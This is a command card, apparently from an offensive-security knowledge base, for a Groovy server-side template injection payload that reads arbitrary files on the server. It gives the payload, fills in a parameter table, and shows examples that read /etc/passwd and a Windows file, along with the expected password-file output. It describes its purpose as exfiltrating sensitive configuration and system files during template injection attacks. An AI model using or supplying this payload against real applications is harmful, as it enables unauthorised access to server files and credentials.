---
type: command
executor: groovy
data: '${String x = new File(''$_FILE_PATH'').getText(''$_ENCODING'')}'
output: null
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Java
  - Web
tags:
  - ssti
  - file-read
  - groovy
verified: true
validated: true
---

# groovy-read-file-text

## Command

```groovy
${String x = new File('$_FILE_PATH').getText('$_ENCODING')}
```

## Description

This Groovy expression reads the text content of a file from the specified path and stores it in a variable for rendering in an SSTI-vulnerable template. Use it to exfiltrate sensitive files like configuration or system files during template injection attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_FILE_PATH | Full path to the target file (e.g., '/etc/passwd' or 'C:/Windows/notepad.exe') | Yes |
| $_ENCODING | Character encoding for reading the file (default: 'UTF-8') | No |

## Examples

### Basic Usage

```groovy
${String x = new File('/etc/passwd').getText('UTF-8')}
```

### Windows Path Usage

```groovy
${String x = new File('C:/Windows/notepad.exe').text}
```

## Expected Output

The file's contents rendered as plain text in the application response, e.g.,

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

If the file is binary or path invalid, an exception like 'No such file or directory' may appear.

## Related

- [[procedures/Server-Side-Template-Injection-Groovy-File-Manipulation]]
- [[commands/groovy-create-new-file]]
